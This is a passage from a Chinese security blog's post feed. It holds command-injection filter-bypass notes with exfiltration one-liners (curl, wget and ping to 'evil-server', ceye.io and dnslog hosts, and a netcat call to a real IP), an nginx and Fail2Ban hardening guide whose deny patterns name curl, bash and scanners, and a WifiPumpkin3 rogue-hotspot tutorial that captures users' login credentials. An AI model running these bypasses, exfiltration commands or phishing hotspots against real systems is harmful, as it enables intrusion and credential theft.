livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">c<span class="hljs-string">\at</span> fl<span class="hljs-string">\ag</span><br></code></pre></td></tr></table></figure><ul><li>通配符</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">/?<span class="hljs-keyword">in</span>/?s =&gt; <span class="hljs-built_in">ls</span><br><br>* 0到无穷个任意字符<br>? 一个任意字符<br>[ ] 一个在括号内的字符，e.g. [abcd]<br>[ - ] 在编码顺序内的所有字符<br>[^ ] 一个不在括号内的字符<br>[! ] 同 ^<br><span class="hljs-built_in">cat</span> fl[0-z]g<br><br><span class="hljs-built_in">echo</span> d&#123;a,e,i,u,o&#125;g =&gt; dag deg dig dug dog<br><span class="hljs-built_in">echo</span> &#123;fl,fla&#125;&#123;ag,g&#125; =&gt; flag flg flaag flag<br><span class="hljs-built_in">echo</span> fl&#123;0..z&#125;g =&gt; fl1g,fl2g,...,flyg,flzg<br><br>花括号拓展&#123;OS_COMMAND,ARGUMENT&#125;<br>在Linux bash中还可以使用&#123;<span class="hljs-built_in">cat</span>,/etc/passwd&#125;来绕过<br>这里没实验成功<br></code></pre></td></tr></table></figure><ul><li>未定义变量</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span><span class="hljs-variable">$x</span> /etc/passwd<br></code></pre></td></tr></table></figure><ul><li>可变函数</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">(sy.(st).em)(whoami)<br><span class="hljs-variable">$_GET</span>[a](<span class="hljs-variable">$_GET</span>[b].<span class="hljs-variable">$_GET</span>[c])<br><br>获取内置函数 system 的索引后，直接执行<br><span class="hljs-title function_ invoke__">get_defined_functions</span>()[internal] | grep ststem<br><span class="hljs-title function_ invoke__">get_defined_functions</span>()[internal][<span class="hljs-number">381</span>](whoami)<br></code></pre></td></tr></table></figure><ul><li><code>$@</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ c<span class="hljs-variable">$@at</span> fl<span class="hljs-variable">$@ag</span><br>flag&#123;xxx&#125;<br><br>$ <span class="hljs-built_in">echo</span> i<span class="hljs-variable">$@d</span><br><span class="hljs-built_in">id</span><br><br>$ i<span class="hljs-variable">$@d</span><br>uid=1000(wywwzjj) gid=1000(wywwzjj) <span class="hljs-built_in">groups</span>=1000(wywwzjj)<br><br>$ <span class="hljs-built_in">echo</span> i<span class="hljs-variable">$@d</span>|<span class="hljs-variable">$0</span><br>uid=1000(wywwzjj) gid=1000(wywwzjj) <span class="hljs-built_in">groups</span>=1000(wywwzjj)<br><br>$ <span class="hljs-built_in">echo</span> &#123;nc,47.101.220.241,2333&#125;|<span class="hljs-variable">$0</span><br>直接连 nc 了。。。<span class="hljs-variable">$0</span> 好牛逼？<br><span class="hljs-variable">$0</span> 就相当于 bash 另外 <span class="hljs-variable">$n</span> 表示命令行第 n 个参数<br><br>$ <span class="hljs-variable">$0</span>&lt;&lt;&lt;<span class="hljs-string">i$@d</span><br><span class="hljs-string">uid=1000(wywwzjj) gid=1000(wywwzjj) groups=1000(wywwzjj)</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><ul><li>利用已经存在的资源</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br><br>$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span>| <span class="hljs-built_in">cut</span> -c 1<br>/<br><br>$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span>| <span class="hljs-built_in">cut</span> -c 1-4<br>/usr<br></code></pre></td></tr></table></figure><ul><li>${PS2} 对应字符 ‘&gt;’</li><li>${PS4} 对应字符 ‘+’</li><li>${IFS} 对应 内部字段分隔符</li><li>${9} 对应 空字符串</li></ul><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><ul><li>弹 shell  </li><li>DNS 外带数据</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://testhash.test.dnslog.link/?`whoami`&quot;</span><br></code></pre></td></tr></table></figure><ul><li>HTTP 外带</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># linux</span><br>curl http://evil-server/`<span class="hljs-built_in">whoami</span>`<br>wget http://evil-server/$(<span class="hljs-built_in">whoami</span>)<br>curl xxxx.ceye.io/`<span class="hljs-built_in">whoami</span>`<br>curl http://xxxx.ceye.io/$(<span class="hljs-built_in">id</span>|<span class="hljs-built_in">base64</span>)<br>ping -c 1 `<span class="hljs-built_in">whoami</span>`.xxxx.ceye.io<br><br><span class="hljs-comment"># windows</span><br>http:<br><span class="hljs-keyword">for</span> /F %x <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;whoami&#x27;</span>) <span class="hljs-keyword">do</span> start http://xxx.ceye.io/%x<br>dns请求：<br>获取计算机名：<span class="hljs-keyword">for</span> /F <span class="hljs-string">&quot;delims=&quot;</span> %i <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;whoami&#x27;</span>) <span class="hljs-keyword">do</span> ping -n 1 %i.xxx.dnslog.info<br>获取用户名：<span class="hljs-keyword">for</span> /F <span class="hljs-string">&quot;delims= tokens=2&quot;</span> %i <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;whoami&#x27;</span>) <span class="hljs-keyword">do</span> ping -n 1 %i.xxx.dnslog.info<br><br><span class="hljs-keyword">for</span> /F %x <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;whoami&#x27;</span>) <span class="hljs-keyword">do</span> powershell <span class="hljs-variable">$a</span>=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(<span class="hljs-string">&#x27;%x&#x27;</span>));<span class="hljs-variable">$b</span>=New-Object System.Net.WebClient;<span class="hljs-variable">$b</span>.DownloadString(<span class="hljs-string">&#x27;http://xxx.ceye.io/&#x27;</span>+<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><ul><li>文件构造（参考橘子那个 hitcon）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;w<br>将会创建一个名字为 w 的空文件。<br></code></pre></td></tr></table></figure><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a><strong>工具</strong></h3><ul><li><a href="https://github.com/ewilded/shelling">shelling</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>网站安全加固</title>
    <link href="/2022/04/29/%E7%BD%91%E7%AB%99%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    <url>/2022/04/29/%E7%BD%91%E7%AB%99%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="网站安全加固"><a href="#网站安全加固" class="headerlink" title="网站安全加固"></a>网站安全加固</h1><blockquote><p id="hitokoto">正在加载一言...</p><span id="more"></span></blockquote><h2 id="0x01-关闭不必要的端口"><a href="#0x01-关闭不必要的端口" class="headerlink" title="0x01 关闭不必要的端口"></a>0x01 关闭不必要的端口</h2><table><thead><tr><th>服务</th><th>端口</th></tr></thead><tbody><tr><td>ssh</td><td>22</td></tr><tr><td>http</td><td>80</td></tr><tr><td>https</td><td>443</td></tr><tr><td>ftp</td><td>21,20000-30000</td></tr></tbody></table><h2 id="0x02-更改Nginx规则防止一些基础的网站攻击"><a href="#0x02-更改Nginx规则防止一些基础的网站攻击" class="headerlink" title="0x02 更改Nginx规则防止一些基础的网站攻击"></a>0x02 更改Nginx规则防止一些基础的网站攻击</h2><p>分享一下我使用的Nginx配置 在站点配置里加入如下配置,可防止一些基础的SQL注入</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (<span class="hljs-variable">$request_uri</span> <span class="hljs-regexp">~* &quot;(cost\()|(concat\()&quot;)</span> &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>; &#125;<br><span class="hljs-attribute">if</span> (<span class="hljs-variable">$request_uri</span> <span class="hljs-regexp">~* &quot;[+|(%20)]union[+|(%20)]&quot;)</span> &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>; &#125;<br><span class="hljs-attribute">if</span> (<span class="hljs-variable">$request_uri</span> <span class="hljs-regexp">~* &quot;[+|(%20)]and[+|(%20)]&quot;)</span> &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>; &#125;<br><span class="hljs-attribute">if</span> (<span class="hljs-variable">$request_uri</span> <span class="hljs-regexp">~* &quot;[+|(%20)]select[+|(%20)]&quot;)</span> &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>; &#125;<br><span class="hljs-attribute">if</span> (<span class="hljs-variable">$request_uri</span> <span class="hljs-regexp">~* &quot;[+|(%20)]or[+|(%20)]&quot;)</span> &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>; &#125;<br><span class="hljs-attribute">if</span> (<span class="hljs-variable">$request_uri</span> <span class="hljs-regexp">~* &quot;[+|(%20)]delete[+|(%20)]&quot;)</span> &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>; &#125;<br><span class="hljs-attribute">if</span> (<span class="hljs-variable">$request_uri</span> <span class="hljs-regexp">~* &quot;[+|(%20)]update[+|(%20)]&quot;)</span> &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>; &#125;<br><span class="hljs-attribute">if</span> (<span class="hljs-variable">$request_uri</span> <span class="hljs-regexp">~* &quot;[+|(%20)]insert[+|(%20)]&quot;)</span> &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>; &#125;<br></code></pre></td></tr></table></figure><p>加入一下配置防止XSS</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (<span class="hljs-variable">$query_string</span> <span class="hljs-regexp">~ &quot;(&lt;|%3C).*script.*(&gt;|%3E)&quot;)</span> &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>; &#125;<br><span class="hljs-attribute">if</span> (<span class="hljs-variable">$query_string</span> <span class="hljs-regexp">~ &quot;GLOBALS(=|\[|\%[0-9A-Z]</span>&#123;0,2&#125;)&quot;) &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>; &#125;<br><span class="hljs-attribute">if</span> (<span class="hljs-variable">$query_string</span> <span class="hljs-regexp">~ &quot;_REQUEST(=|\[|\%[0-9A-Z]</span>&#123;0,2&#125;)&quot;) &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>; &#125;<br><span class="hljs-attribute">if</span> (<span class="hljs-variable">$query_string</span> <span class="hljs-regexp">~ &quot;proc/self/environ&quot;)</span> &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>; &#125;<br><span class="hljs-attribute">if</span> (<span class="hljs-variable">$query_string</span> <span class="hljs-regexp">~ &quot;mosConfig_[a-zA-Z_]</span>&#123;1,21&#125;(=|\%3D)&quot;) &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>; &#125;<br><span class="hljs-attribute">if</span> (<span class="hljs-variable">$query_string</span> <span class="hljs-regexp">~ &quot;base64_(en|de)code\(.*\)&quot;)</span> &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>; &#125;<br></code></pre></td></tr></table></figure><p>防止文件注入</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (<span class="hljs-variable">$query_string</span> <span class="hljs-regexp">~ &quot;[a-zA-Z0-9_]=http://&quot;)</span> &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>; &#125;<br><span class="hljs-attribute">if</span> (<span class="hljs-variable">$query_string</span> <span class="hljs-regexp">~ &quot;[a-zA-Z0-9_]=(\.\.//?)+&quot;)</span> &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>; &#125;<br><span class="hljs-attribute">if</span> (<span class="hljs-variable">$query_string</span> <span class="hljs-regexp">~ &quot;[a-zA-Z0-9_]=/([a-z0-9_.]//?)+&quot;)</span> &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>; &#125;<br></code></pre></td></tr></table></figure><p>增加一些简单的规则防护</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (<span class="hljs-variable">$query_string</span> <span class="hljs-regexp">~* &quot;.*(&#x27;|--|union|insert|drop|truncate|update|from|grant|exec|where|select|and|or|count|chr|mid|like|iframe|script|alert|webscan|dbappsecurity|style|confirm|innerhtml|innertext|class).*&quot;)</span> &#123; <span class="hljs-attribute">return</span> <span class="hljs-number">404</span>; &#125;<br></code></pre></td></tr></table></figure><p>封杀各种爬虫,UA</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (<span class="hljs-variable">$http_user_agent</span> <span class="hljs-regexp">~* &quot;java|python|perl|ruby|curl|bash|echo|uname|base64|decode|md5sum|select|concat|httprequest|httpclient|nmap|scan&quot;</span> ) &#123;<br><br>    <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如有需要可开启强制IP访问,防止扫描</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> ( <span class="hljs-variable">$host</span> !<span class="hljs-regexp">~* &#x27;abc.com&#x27;</span> ) &#123;<br>    <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x03-开启Nginx自带的WAF"><a href="#0x03-开启Nginx自带的WAF" class="headerlink" title="0x03 开启Nginx自带的WAF"></a>0x03 开启Nginx自带的WAF</h2><p>在宝塔—Nginx配置文件里有一行 <code>#include luawaf.conf;</code>取消注释并开启</p><h2 id="0x04-开启Fail2Ban防止SSH-FTP-爆破-网站扫描"><a href="#0x04-开启Fail2Ban防止SSH-FTP-爆破-网站扫描" class="headerlink" title="0x04 开启Fail2Ban防止SSH FTP 爆破,网站扫描"></a>0x04 开启Fail2Ban防止SSH FTP 爆破,网站扫描</h2><p>所以用好 Fail2Ban 其实最重要的就是如何根据日志制定有效的监狱规则，规则制订完了还需要测试一下这个规则是否生效了，是否真的可以起到预期的目的。下面明月就结合一个实际的案例给大家具体的讲解一下：</p><p>如果经常分析 Nginx 站点日志的话，很多站长朋友们应该都会发现，站点经常收到很多返回码是 404 的请求</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">//plus/mytag_j.php?aid=6022<br>//plus/ad_js.php?aid=9090<br>//plus/ad_js.php?aid=8888<br>//plus/mytag_js.php?aid=8080<br>//utility/convert/data/config.inc.php<br></code></pre></td></tr></table></figure><p>是返回 404 的，看似都是些很“正常”的无效访问而已，不过，仔细分析日志以及过往日志后就发现类似这种返回 404 结果的请求,这种行为的目的我们先不去深究，就这种频率绝对算是一种骚扰了，如果数量再大一些频率再高一些那影响和浪费的可就是服务器带宽和流量了。所以，这种请求必须进行应对措施，至少让其不能这么肆无忌惮呀！</p><blockquote><p>借助 Fail2Ban 可以筛选出发送这些请求的 IP 地址来进行拦截屏蔽处理，根据日志中返回 404 的记录制定 Fail2Ban 监狱规则</p></blockquote><p>命名为 **<code>nginx-not-found.conf</code>**，具体内容如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">vim /etc/fail2ban/filter.d/nginx-not-found.conf<br></code></pre></td></tr></table></figure><p>打开编辑 <code>nginx-not-found.conf</code> 监狱规则文件，注意一定要在<code>/etc/fail2ban/filter.d/</code>目录内哦。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">[Definition]<br>failregex = ^&lt;HOST&gt;.*&quot;(GET|POST).*&quot; (404|444|403|400) .*$<br>ignoreregex =<br></code></pre></td></tr></table></figure><p>保存退出,再打开编辑 <strong><code>jail.local</code></strong> 启用这个监狱规则。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">vim /etc/fail2ban/jail.local<br></code></pre></td></tr></table></figure><p>添加下面的代码到 jail.local 里即可。同样的，注意 jail.local 文件的目录哦。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs text">[nginxno404]<br>#处理 nginx 下的恶意 404 结果扫描<br>enabled = true<br>port = http,https<br>filter = nginx-not-found<br>action = iptables[name=nginxno404, port=http, protocol=tcp]<br>#Fail2Ban 要监控的站点日志文件，大家可以根据自己站点来灵活调整。<br>logpath  = /www/wwwlogs/access.log<br>           /www/wwwlogs/www.weblog.com.log<br>bantime = 3600 #默认是屏蔽 IP 地址 10 分钟<br>#下面这两个是说 60 秒内 5 次 404 失败请求就开始屏蔽这个 IP 地址<br>findtime = 60<br>maxretry = 5<br></code></pre></td></tr></table></figure><p>保存退出,重新启动 Fail2Ban：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">systemctl restart fail2ban.service<br></code></pre></td></tr></table></figure><p>这时候，我们换需要验证一下 nginx-not-found.conf 这个监狱规则是否能够生效也就是真正的发现日志文件中返回码是：404、444、403、400 中任意一个的记录，我们可以使用 <code>fail2ban-regex</code> 命令来验证这个规则，具体命令如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">fail2ban-regex /www/wwwlogs/www.weblog.com.log /etc/fail2ban/filter.d/nginx-not-found.conf<br></code></pre></td></tr></table></figure><p>上述命令就是用<code>/www/wwwlogs/www.weblog.com.log</code> 这个日志文件来测试<code>/etc/fail2ban/filter.d/nginx-not-found.conf</code> 监狱规则是否能够生效</p><p>在实际生产环境中使用这个监狱规则的时候不可避免的会出现“误封IP”的发生，一旦发现误伤我们就需要解除某个 IP 地址的屏蔽，这时候可以使用 <strong><code>fail2ban-client</code></strong> 命令来解除某给 IP 地址的屏蔽，比如：我们要解除 <code>172.16.1.1</code> 这个 IP 地址只需要**<code>fail2ban-client set &lt;监狱名称&gt; unbanip  &lt;IP 地址&gt;</code>** 这样命令即可解除，如：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">fail2ban-client set nginxno404  unbanip 172.16.1.1<br></code></pre></td></tr></table></figure><p>运行成功后会返回解除屏蔽的 IP 地址,同时我们还可以查看[nginxno404]这个监狱的运行状况来查看已经屏蔽的 IP 地址有哪些：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">fail2ban-client status nginxno404<br></code></pre></td></tr></table></figure><p>这个命令会显示监狱[nginxno404]一共被触发了几次，施行屏蔽（Ban）IP 几次，IP 地址分别是哪几个</p>]]></content>
    
    
    <categories>
      
      <category>运维</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用WifiPumpKin3钓鱼</title>
    <link href="/2022/04/28/Kali-Linux-Wifi%E9%92%93%E9%B1%BC/"/>
    <url>/2022/04/28/Kali-Linux-Wifi%E9%92%93%E9%B1%BC/</url>
    
    <content type="html"><![CDATA[<h1 id="使用Wifipumpkin3钓鱼"><a href="#使用Wifipumpkin3钓鱼" class="headerlink" title="使用Wifipumpkin3钓鱼"></a>使用Wifipumpkin3钓鱼</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p><code>wifipumpkin3</code>是用Python编写wifi钓鱼攻击强大框架<br>可以快速方便的搭建一个钓鱼wifi，进行钓鱼或中间人攻击，免去了手动搭建环境的繁琐步骤<br>  <span id="more"></span></p></blockquote><p><strong>支持的攻击种类有：</strong></p><blockquote><ul><li>恶意访问点攻</li><li>中间人攻击</li><li>死角接入点攻击</li><li>额外的Captiveflask模板</li><li>DNS劫持</li><li>俘虏门户攻击 (captiveflask)</li><li>拦截，检查，修改和重放网络流量</li><li>WiFi网络扫描</li><li>DNS监控服务</li><li>凭证收集</li><li>透明代理</li><li>LLMNR，NBT-NS和MDNS 投毒(<a href="https://github.com/skelsec/Responder3">Responder3</a>)</li><li>and <strong>more</strong>!</li></ul></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><blockquote><p>使用环境：<code>kali 2021.4</code></p><p>网卡：<code>RT5572-(802.11ac USB2.0)</code></p></blockquote><h3 id="依赖安装"><a href="#依赖安装" class="headerlink" title="依赖安装"></a>依赖安装</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sudo apt <span class="hljs-keyword">install </span>hostapd  <br>sudo apt <span class="hljs-keyword">install </span>libssl-dev libffi-dev <span class="hljs-keyword">build-essential</span><br><span class="hljs-keyword"></span>sudo apt <span class="hljs-keyword">install </span>python3-pyqt5<br></code></pre></td></tr></table></figure><h3 id="框架安装"><a href="#框架安装" class="headerlink" title="框架安装"></a>框架安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/P0cL4bs/wifipumpkin3.git<br><span class="hljs-built_in">cd</span> wifipumpkin3<br>sudo python3 setup.py install<br></code></pre></td></tr></table></figure><p>安装完成后使用<code>sudo wifipumpkin3 </code>命令即可开启框架</p><p><img src="https://z3.ax1x.com/2021/10/26/55R9tU.png" alt="image-20210420123636783"></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="搭建简单钓鱼热点"><a href="#搭建简单钓鱼热点" class="headerlink" title="搭建简单钓鱼热点"></a>搭建简单钓鱼热点</h3><p>使用以下命令可以建立起一个简单的热点</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 设置热点名称</span><br>wp3 &gt; <span class="hljs-built_in">set</span> ssid &lt;名称&gt;<br><span class="hljs-comment"># 选择网卡</span><br>wp3 &gt; <span class="hljs-built_in">set</span><span class="hljs-built_in"> interface </span>&lt;网卡&gt;<br><span class="hljs-comment"># 设置代理插件</span><br>wp3 &gt; <span class="hljs-built_in">set</span><span class="hljs-built_in"> proxy </span>noproxy<br>wp3 &gt; start<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/10/26/55RChF.png" alt="image-20210420123850978"></p><p>这时我们就能搜索到搭建的热点</p><p><img src="https://z3.ax1x.com/2021/10/26/552vmq.png" alt="image-20210420123930614"></p><p>可以正常连接，同时，我们的kali上也会显示连接情况</p><p><img src="https://z3.ax1x.com/2021/10/26/55RpkT.png" alt="image-20210420124013058"></p><h3 id="利用Captiveflask强制用户登录"><a href="#利用Captiveflask强制用户登录" class="headerlink" title="利用Captiveflask强制用户登录"></a>利用Captiveflask强制用户登录</h3><blockquote><p><strong>Captiveflask</strong>是框架中代理功能中的一个选项，他可以阻止连接此Wifi的用户上网，并令http请求跳转到钓鱼登录页面，从而获取用户的账号密码</p></blockquote><p><strong>以内置的登录网页为例</strong></p><p>在<code>wifipumpkin3/wifipumpkin3/plugins/captiveflask</code>目录，有四个内置登录网页</p><p><img src="https://z3.ax1x.com/2021/10/26/552x00.png" alt="image-20210420124236705"></p><p>我们此次使用DarkLogin.py</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 设置热点名称</span><br>wp3 &gt; <span class="hljs-built_in">set</span> ssid evil<br><span class="hljs-comment"># 选择网卡</span><br>wp3 &gt; <span class="hljs-built_in">set</span><span class="hljs-built_in"> interface </span>wlan0<br><span class="hljs-comment"># 设置代理插件</span><br>wp3 &gt; <span class="hljs-built_in">set</span><span class="hljs-built_in"> proxy </span>captiveflask<br><span class="hljs-comment"># 设置模板</span><br>wp3 &gt; <span class="hljs-built_in">set</span> captiveflask.DarkLogin <span class="hljs-literal">true</span><br>wp3 &gt; start<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/10/26/552z7V.png" alt="image-20210420124435200"></p><p>通过<code>proxies</code>命令可以看到现在启用的插件和代理</p><p><img src="https://z3.ax1x.com/2021/10/26/55Rkc9.png" alt="image-20210420124530269"></p><p>此时链接wifi，即可显示登录页面</p><p><img src="https://z3.ax1x.com/2021/10/26/55Rip4.png" alt="image-20210420124916804"></p><p>如果在此页面输入账号密码，就会被捕获</p><p><img src="https://z3.ax1x.com/2021/10/26/55RAXR.png" alt="image-20210420125131231"></p><p>未登录前所有http网站都无法访问，但是要注意的是，此插件<strong>无法拦截https流量</strong></p><p>如果想要拦截https流量，需要做以下修改：</p><p>设定拦截https</p><p>首先关闭<code>wifipumpkin3</code></p><p>修改<code>wifipumpkin3/core/servers/proxy/captiveflask.py</code>，在第119行添加如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">print</span>(display_messages(<span class="hljs-string">&quot;redirecting HTTPS traffic&quot;</span>, <span class="hljs-attribute">info</span>=<span class="hljs-literal">True</span>))<br>        self.add_default_rules(<br>            <span class="hljs-string">&quot;&#123;iptables&#125; -t nat -A PREROUTING -i &#123;iface&#125; -p tcp --dport 443 -j DNAT --to-destination &#123;ip&#125;:443&quot;</span>.format(<br>                <span class="hljs-attribute">iptables</span>=self.getIptablesPath, <span class="hljs-attribute">iface</span>=IFACE, <span class="hljs-attribute">ip</span>=IP_ADDRESS, <span class="hljs-attribute">port</span>=PORT<br>            )<br>        )<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/10/26/55RF1J.png" 